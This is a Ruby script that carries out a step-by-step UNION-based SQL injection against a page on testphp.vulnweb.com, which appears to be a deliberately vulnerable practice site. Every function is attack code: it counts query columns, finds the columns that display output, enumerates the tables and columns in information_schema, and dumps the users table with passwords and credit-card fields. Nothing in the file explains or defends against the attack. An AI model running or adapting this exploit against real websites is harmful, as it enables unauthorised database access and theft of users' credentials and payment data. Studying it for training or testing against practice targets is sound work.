require 'net/http'

VULNERABLE_PAGE = 'http://testphp.vulnweb.com/listproducts.php'

def enum_column_number
  uri = URI(VULNERABLE_PAGE)
  Net::HTTP.start(uri.hostname) do |http|
    (1..).each do |i|
      uri.query = "cat=1 ORDER BY #{i}-- -"
      res = http.get(uri).body
      if /Unknown column/.match?(res)
        puts "There are #{i - 1} columns" # 11
        break
      end
    end
  end
end

def find_vuln_columns
  # ["01noraj01", ..., "11noraj11"]
  canaries = (1..11).map { |x| "%02dnoraj%02d" % [x,x] }
  uri = URI(VULNERABLE_PAGE)

  # "'01noraj01','02noraj02',...,'11noraj11'"
  payload = canaries.map{|x| "'#{x}'"}.join(',')

  # "cat=-1 UNION SELECT '01noraj01',...,'11noraj11'""
  uri.query = "cat=-1 UNION SELECT #{payload}"
  res = Net::HTTP.get(uri)
  canaries.each_with_index do |canary, i|
    # 1, 2, 7, 8, 9, 10, 11
    puts "Column n°#{i+1} displays output" if /#{canary}/.match?(res)
  end
end

# without using group_concat()
# 7th column is in <h3></h3>
def enum_tables
  uri = URI(VULNERABLE_PAGE)
  uri.query = 'cat=-1 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema=database()-- -'
  res = Net::HTTP.get(uri)
  tables = res.scan(/<h3>(.+?)<\/h3>/).flatten
  tables.delete('Links')
  tables.each do |table|
    puts table
  end
end

def enum_columns(table)
  uri = URI(VULNERABLE_PAGE)
  uri.query = "cat=-1 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_schema=database() AND table_name='#{table}'-- -"
  res = Net::HTTP.get(uri)
  tables = res.scan(/<h3>(.+?)<\/h3>/).flatten
  tables.delete('Links')
  tables.each do |table|
    puts table
  end
end

def enum_users
  uri = URI(VULNERABLE_PAGE)
  uri.query = "cat=-1 UNION SELECT 1,2,3,4,5,6,concat(name,':',uname,':','<email>',':',pass,':',phone,':','<address>',':',cart,':',cc),8,9,10,11 FROM users"
  res = Net::HTTP.get(uri)
  tables = res.scan(/<h3>(.+?)<\/h3>/).flatten
  tables.delete('Links')
  tables.each do |table|
    puts table
  end
end

#enum_column_number
#find_vuln_columns
#enum_tables
#enum_columns('users')
#enum_users
